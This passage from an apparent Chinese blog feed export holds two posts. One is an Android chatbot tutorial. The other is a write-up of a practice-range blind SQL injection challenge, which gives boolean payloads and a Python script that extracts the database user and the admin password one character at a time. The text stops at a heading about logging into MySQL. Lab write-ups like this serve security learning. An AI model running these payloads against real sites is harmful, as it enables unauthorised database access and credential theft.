<li>偶然在网上看到一个免费机器人接口，所以生此想法，接口地址：<a href="http://api.qingyunke.com/%EF%BC%8CAndroid%E5%BC%80%E5%8F%91%E6%AF%94%E7%88%AC%E8%99%AB%E8%A6%81%E7%B9%81%E7%90%90%E5%BE%97%E5%A4%9A%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9C%AC%E6%96%87%E6%88%91%E5%B0%86%E7%BB%86%E8%AF%B4%E6%8E%A5%E5%8F%A3%E7%9A%84%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%8C%E8%AF%BB%E8%80%85%E5%8F%AF%E6%A0%B9%E6%8D%AE%E6%80%9D%E8%B7%AF%E5%8E%BB%E7%BD%91%E4%B8%8A%E6%89%BE%E4%B8%80%E4%BA%9B%E5%85%8D%E8%B4%B9%E6%8E%A5%E5%8F%A3%E6%8B%BF%E6%9D%A5%E7%8E%A9%EF%BC%8C%E5%85%B6%E4%BB%96%E4%BB%A3%E7%A0%81%E4%B8%80%E5%B8%A6%E8%80%8C%E8%BF%87%EF%BC%8C%E8%AF%A6%E7%BB%86%E6%BA%90%E7%A0%81%E8%A7%81%E6%96%87%E6%9C%AB%E3%80%82">http://api.qingyunke.com/，Android开发比爬虫要繁琐得多，所以本文我将细说接口的调用方法，读者可根据思路去网上找一些免费接口拿来玩，其他代码一带而过，详细源码见文末。</a></li>
<li>成品展示：<img src="https://img-blog.csdnimg.cn/20200409104838283.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h2 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h2><h3 id="（1）新建项目empty，必要可github托管。"><a href="#（1）新建项目empty，必要可github托管。" class="headerlink" title="（1）新建项目empty，必要可github托管。"></a>（1）新建项目empty，必要可github托管。</h3><h3 id="（2）先写页面"><a href="#（2）先写页面" class="headerlink" title="（2）先写页面"></a>（2）先写页面</h3><ul>
<li>在res-&gt;layout目录下新建两个layout xml file<br><img src="https://img-blog.csdnimg.cn/20200409105424366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>activity_main作为主页面，msg_item为附在其上的消息页面。（具体代码见文末）</li>
<li>这里再acitvity_main采用的不是ListView而是RecyclerView。<h3 id="（3）写接口调用"><a href="#（3）写接口调用" class="headerlink" title="（3）写接口调用"></a>（3）写接口调用</h3></li>
<li>首先封装一个RobotManager类，用于接收用户输入之后对Url进行封装。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RobotManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String  url = <span class="string">&quot;http://api.qingyunke.com/api.php?key=free&amp;appid=0&amp;msg=!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getUrl</span><span class="params">(String question)</span></span>&#123;</span><br><span class="line">        String real_url = url.replace(<span class="string">&quot;!!&quot;</span>,question);<span class="comment">//将url中的!!替换为用户输入的内容</span></span><br><span class="line">        <span class="keyword">return</span> real_url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>其次在java-&gt;第一个包下创建一个接口GetConnection，用来接收接口返回的返回。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">GetConnection</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onFinish</span><span class="params">(String response)</span></span>;	<span class="comment">//返回正常</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onError</span><span class="params">(Exception e)</span></span>;	<span class="comment">//返回错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>然后开始写MyConnection类，调用接口，给参，并通过GetConnection接口将网上接口返回的数据传递出去。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyConnection</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getResponse</span><span class="params">(<span class="keyword">final</span> String url,<span class="keyword">final</span> GetConnection getConnection)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                HttpURLConnection connection;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    URL Url = <span class="keyword">new</span> URL(url);</span><br><span class="line">                    connection = (HttpURLConnection) Url.openConnection();</span><br><span class="line">                    connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);<span class="comment">//Get方法</span></span><br><span class="line">                    connection.setConnectTimeout(<span class="number">2000</span>);<span class="comment">//延时时间</span></span><br><span class="line">                    connection.setReadTimeout(<span class="number">3000</span>);</span><br><span class="line">                    connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">                    InputStream in = connection.getInputStream();</span><br><span class="line">                    BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">                    StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        response.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                    Log.e(<span class="string">&quot;result&quot;</span>,response.toString());</span><br><span class="line">                    <span class="keyword">if</span> (getConnection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        getConnection.onFinish(response.toString());</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        Log.e(<span class="string">&quot;WeiNull&quot;</span>,<span class="string">&quot;WeiNull&quot;</span>);<span class="comment">//测试时用的，无须关心。</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(IOException io) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (getConnection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        getConnection.onError(io);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="（4）写页面逻辑"><a href="#（4）写页面逻辑" class="headerlink" title="（4）写页面逻辑"></a>（4）写页面逻辑</h3><ul>
<li>页面逻辑主要是将从接口得到的内容渲染到页面上。首先进行一系列初始化，绑定布局，然后监听按钮点击接收用户输入，调用MyConnection类传入url,输入内容接收接口返回内容，同时用handler动态更新页面。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Msg&gt; msgList = <span class="keyword">new</span> ArrayList&lt;Msg&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> EditText inputText;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Button send;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RecyclerView msgRecyclerView;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MsgAdapter adapter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(<span class="meta">@NonNull</span> Message msg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">switch</span> (msg.what)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line">                    Bundle data = msg.getData();</span><br><span class="line">                    String result = data.getString(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">                    Msg robotMsg = <span class="keyword">new</span> Msg(result,Msg.TYPE_RECEIVED);</span><br><span class="line">                    msgList.add(robotMsg);</span><br><span class="line">                    adapter.notifyItemInserted(msgList.size() - <span class="number">1</span>); <span class="comment">// 当有新消息时，刷新ListView中的显示</span></span><br><span class="line">                    msgRecyclerView.scrollToPosition(msgList.size() - <span class="number">1</span>); <span class="comment">// 将ListView定位到最后一行</span></span><br><span class="line">                &#125;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:&#123;&#125;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getInter</span><span class="params">(String content)</span></span>&#123;</span><br><span class="line">        MyConnection.getResponse(RobotManager.getUrl(content), <span class="keyword">new</span> GetConnection() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFinish</span><span class="params">(String response)</span> </span>&#123;</span><br><span class="line">                ContentBean contentBean = <span class="keyword">new</span> ContentBean();</span><br><span class="line">                Log.e(<span class="string">&quot;getResult&quot;</span>,response);</span><br><span class="line">                Message msg = <span class="keyword">new</span> Message();</span><br><span class="line">                Bundle data = <span class="keyword">new</span> Bundle();</span><br><span class="line">                Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">                contentBean = gson.fromJson(response,ContentBean.class);	<span class="comment">//用Gson将返回内容序列化为ContentBean对象。</span></span><br><span class="line">                <span class="keyword">if</span>(contentBean.getResult()==<span class="number">0</span>)&#123;</span><br><span class="line">                    data.putString(<span class="string">&quot;result&quot;</span>,contentBean.getContent());</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    data.putString(<span class="string">&quot;result&quot;</span>,<span class="string">&quot;我听不懂你在说什么呀！&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                msg.setData(data);</span><br><span class="line">                msg.what = <span class="number">1</span>;</span><br><span class="line">                handler.sendMessage(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(Exception e)</span> </span>&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initMsgs(); <span class="comment">// 初始化消息数据</span></span><br><span class="line">        inputText = findViewById(R.id.input_text);</span><br><span class="line">        send =  findViewById(R.id.send);</span><br><span class="line">        msgRecyclerView =  findViewById(R.id.msg_recycler_view);</span><br><span class="line">        LinearLayoutManager layoutManager = <span class="keyword">new</span> LinearLayoutManager(<span class="keyword">this</span>);</span><br><span class="line">        msgRecyclerView.setLayoutManager(layoutManager);</span><br><span class="line">        adapter = <span class="keyword">new</span> MsgAdapter(msgList);</span><br><span class="line">        msgRecyclerView.setAdapter(adapter);</span><br><span class="line">        send.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String content = inputText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(content)) &#123;</span><br><span class="line">                    Msg msg = <span class="keyword">new</span> Msg(content, Msg.TYPE_SENT);</span><br><span class="line">                    msgList.add(msg);</span><br><span class="line">                    getInter(content);</span><br><span class="line">                    Log.e(<span class="string">&quot;url&quot;</span>,RobotManager.getUrl(content));</span><br><span class="line">                    adapter.notifyItemInserted(msgList.size() - <span class="number">1</span>); <span class="comment">// 当有新消息时，刷新ListView中的显示</span></span><br><span class="line">                    msgRecyclerView.scrollToPosition(msgList.size() - <span class="number">1</span>); <span class="comment">// 将ListView定位到最后一行</span></span><br><span class="line">                    inputText.setText(<span class="string">&quot;&quot;</span>); <span class="comment">// 清空输入框中的内容</span></span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initMsgs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Msg msg1 = <span class="keyword">new</span> Msg(<span class="string">&quot;我是菲菲，快来和我聊天吧* ( ´͈ ᵕ `͈ )◞♡&quot;</span>, Msg.TYPE_RECEIVED);</span><br><span class="line">        msgList.add(msg1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>由于接口返回的数据是Json格式，所以我们需要对Json进行解析，本文采用google的Gson库对其进行解析，将接口内容序列化为一个类ContentBean。解析过程见上面代码。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContentBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * result : 0</span></span><br><span class="line"><span class="comment">     * content : [04月08日] 邯郸天气：小雨，白天 17℃，夜晚 9℃，微风，&lt;3级转3-4级</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> result;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setResult</span><span class="params">(<span class="keyword">int</span> result)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.result = result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="（5）其余代码"><a href="#（5）其余代码" class="headerlink" title="（5）其余代码"></a>（5）其余代码</h3><ul>
<li>Msg和MsgAdapter用于解析消息是发送方还是接收方<br>并展示在消息列表上</li>
<li>Msg</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Msg</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TYPE_RECEIVED = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TYPE_SENT = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> type;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Msg</span><span class="params">(String content, <span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>MsgAdapter</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MsgAdapter</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">Adapter</span>&lt;<span class="title">MsgAdapter</span>.<span class="title">ViewHolder</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Msg&gt; mMsgList;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">ViewHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        LinearLayout leftLayout;</span><br><span class="line"></span><br><span class="line">        LinearLayout rightLayout;</span><br><span class="line"></span><br><span class="line">        TextView leftMsg;</span><br><span class="line"></span><br><span class="line">        TextView rightMsg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ViewHolder</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(view);</span><br><span class="line">            leftLayout = (LinearLayout) view.findViewById(R.id.left_layout);</span><br><span class="line">            rightLayout = (LinearLayout) view.findViewById(R.id.right_layout);</span><br><span class="line">            leftMsg = (TextView) view.findViewById(R.id.left_msg);</span><br><span class="line">            rightMsg = (TextView) view.findViewById(R.id.right_msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MsgAdapter</span><span class="params">(List&lt;Msg&gt; msgList)</span> </span>&#123;</span><br><span class="line">        mMsgList = msgList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ViewHolder <span class="title">onCreateViewHolder</span><span class="params">(ViewGroup parent, <span class="keyword">int</span> viewType)</span> </span>&#123;</span><br><span class="line">        View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.msg_item, parent, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ViewHolder(view);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(ViewHolder holder, <span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        Msg msg = mMsgList.get(position);</span><br><span class="line">        <span class="keyword">if</span> (msg.getType() == Msg.TYPE_RECEIVED) &#123;</span><br><span class="line">            <span class="comment">// 如果是收到的消息，则显示左边的消息布局，将右边的消息布局隐藏</span></span><br><span class="line">            holder.leftLayout.setVisibility(View.VISIBLE);</span><br><span class="line">            holder.rightLayout.setVisibility(View.GONE);</span><br><span class="line">            holder.leftMsg.setText(msg.getContent());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(msg.getType() == Msg.TYPE_SENT) &#123;</span><br><span class="line">            <span class="comment">// 如果是发出的消息，则显示右边的消息布局，将左边的消息布局隐藏</span></span><br><span class="line">            holder.rightLayout.setVisibility(View.VISIBLE);</span><br><span class="line">            holder.leftLayout.setVisibility(View.GONE);</span><br><span class="line">            holder.rightMsg.setText(msg.getContent());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mMsgList.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><ul>
<li>以上代码可复制使用，但其中有一些图片，类库什么的需要自行导入，完整代码见github：<a href="https://github.com/lrffun/PiggyRobot">点击此处直达</a></li>
<li><a href="https://download.csdn.net/download/weixin_44371842/12316725">完整项目+apk安装包直接下载地址</a></li>
<li>该项目是我早期项目，只是为了记录当初的开发流程，所以并不存在什么设计模式，代码结构也比较乱，注释也比较少，如果有任何问题，欢迎添加我的QQ询问！<br><img src="https://img-blog.csdnimg.cn/2020040911432093.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><blockquote>
<p>Tip：本文代码，内容均个人原创，个别代码曾经参考过资料，如涉及侵权请联系作者删除。</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>项目笔记</category>
        <category>Android</category>
      </categories>
      <tags>
        <tag>项目笔记</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次用Python挑战SQL注入</title>
    <url>/2020/04/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%A8Python%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li><p>最近哥们给我分享了一个靶场地址，疫情在家闲着无聊便拿来挑战一下。</p>
</li>
<li><p><a href="https://hack.zkaq.cn/">靶场地址</a></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2></li>
<li><p>可以看到，题目要求是拿到管理员密码即可。<br><img src="https://img-blog.csdnimg.cn/20200413171506664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>再进入靶机页面瞅瞅，看来就是要在url上操作了<br><img src="https://img-blog.csdnimg.cn/20200413171823314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>简单加一个and 1=1和and 1=2，发现1=1时，显示下面的猫舍介绍，1=2时，不显示猫舍介绍。这个变化就作为分辨依据。<br><img src="https://img-blog.csdnimg.cn/20200413174244815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<h2 id="开始挑战"><a href="#开始挑战" class="headerlink" title="开始挑战"></a>开始挑战</h2><h3 id="先拿一手user-（此时我已经忘记题目要求要拿管理员密码。。。。。）"><a href="#先拿一手user-（此时我已经忘记题目要求要拿管理员密码。。。。。）" class="headerlink" title="先拿一手user()（此时我已经忘记题目要求要拿管理员密码。。。。。）"></a>先拿一手user()（此时我已经忘记题目要求要拿管理员密码。。。。。）</h3><h5 id="先拿user-长度"><a href="#先拿user-长度" class="headerlink" title="先拿user()长度"></a>先拿user()长度</h5><ul>
<li>先and char_length(user())&gt;0，OK</li>
<li>再and char_length(user()&gt;100),ERROR</li>
<li>。。。。。。（中间省略，自己慢慢试）</li>
<li>就这样把user()的长度试了出来，16。<h5 id="长度出来，试字段"><a href="#长度出来，试字段" class="headerlink" title="长度出来，试字段"></a>长度出来，试字段</h5></li>
<li>用and ASCII(mid(user(),1,1))&gt;0，试出来后查表转换为字符</li>
<li>然后我们用python（不要问我为啥突然用python，试了8个字符后，手都试酸了。。。T0T）</li>
<li>上代码（代码不能直接用啊，自己简单分析一下，根据自己要获取的内容改一下，再补全IP就能用了）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re,requests</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line">string = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):	<span class="comment">#循环第几个字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):	<span class="comment">#从ASCII码表的第几到几开始试，试全部可能会慢很多</span></span><br><span class="line">        <span class="comment">#url = &#x27;http://117.167.*.*:10180/index.php?id=1%20and%20(select%20ascii(mid(password,&#x27;+str(j)+&#x27;,1))%20from%20admin)=&#x27;+str(i) #找password时候用的</span></span><br><span class="line">        <span class="comment">#url = &#x27;http://117.167.*.*:10180/index.php?id=1&#x27;+&#x27;and ASCII(mid(1,1))=&#x27;+str(i)</span></span><br><span class="line">        url = <span class="string">&#x27;http://117.167.*.*:10180/index.php?id=1%20and%20ASCII(mid(user(),&#x27;</span>+str(j)+<span class="string">&#x27;,1))=&#x27;</span>+str(i)</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        res.encoding = <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;猫舍介绍&quot;</span> <span class="keyword">in</span> res.text):<span class="comment">#判断返回的是OK还是ERROR</span></span><br><span class="line">            print(str(j)+<span class="string">&#x27;是&#x27;</span>+str(i))</span><br><span class="line">            result.append(str(j)+<span class="string">&#x27;:&#x27;</span>+str(i))</span><br><span class="line">            string.append(str(j)+<span class="string">&#x27;:&#x27;</span>+chr(i)) <span class="comment">#将得到的编码自动转换成字符</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;不是&#x27;</span>+str(i))</span><br><span class="line"></span><br><span class="line">print(result)</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
<ul>
<li>程序运行完之后记得查看输出结果是否有没试出来的字符，可以换个区间重新试一下或者自己手动试。</li>
</ul>
<h3 id="同理再拿一手database"><a href="#同理再拿一手database" class="headerlink" title="同理再拿一手database()"></a>同理再拿一手database()</h3><ul>
<li>maoshe<h3 id="再拿一手version"><a href="#再拿一手version" class="headerlink" title="再拿一手version()"></a>再拿一手version()</h3></li>
<li>5.5.53<h3 id="再拿一手hostname"><a href="#再拿一手hostname" class="headerlink" title="再拿一手hostname"></a>再拿一手hostname</h3></li>
<li>gongksik_d45fb6<h3 id="再拿一手。。。。。。"><a href="#再拿一手。。。。。。" class="headerlink" title="再拿一手。。。。。。"></a>再拿一手。。。。。。</h3><h3 id="哎，我到底要拿啥来着，哦对，管理员密码"><a href="#哎，我到底要拿啥来着，哦对，管理员密码" class="headerlink" title="哎，我到底要拿啥来着，哦对，管理员密码"></a>哎，我到底要拿啥来着，哦对，管理员密码</h3><h4 id="先找表"><a href="#先找表" class="headerlink" title="先找表"></a>先找表</h4></li>
<li>先随便试一下有没有admin表，and (select count(*) from admin)&gt;0，Woc！！！还真有！</li>
<li>再随便试一下有没有password字段，and(select count(password) from admin)&gt;0，Woc！！！又有！</li>
<li>这里博主走了点狗屎运，读者请勿模仿，自行一个个猜哈~</li>
<li>接下来就简单了，用上上面的python代码</li>
<li>注入标记改为(select ASSII(mid(password,1,1)))&gt;0</li>
<li>然后就得到了管理员密码——（自己试去，┑(￣▽ ￣)┍）<h3 id="接下来最重要的步骤——登录MySQL系统"><a href="#接下来最重要的步骤——登录MySQL系统" class="headerlink" title="接下来最重要的步骤——登录MySQL系统"></a>接下来最重要的步骤——登录MySQL系统</h3></li>
